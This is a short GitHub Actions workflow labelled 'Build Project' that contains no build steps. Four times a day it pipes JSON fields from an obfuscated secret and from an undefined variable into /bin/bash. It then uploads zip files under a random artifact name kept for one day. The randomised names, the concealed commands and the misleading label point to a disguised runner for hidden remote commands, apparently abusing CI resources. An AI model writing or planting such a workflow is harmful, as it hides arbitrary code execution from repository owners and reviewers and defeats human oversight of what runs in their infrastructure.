name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '15 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          xw508: ${{ secrets.xw508 }}
        run: |
          printf '%s' "$xw508" | jq -r .jxztw61 | /bin/bash
          echo $asql9753 | jq -r .zk7913 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: gnzLGjpk
          path: "*.zip"
          retention-days: 1
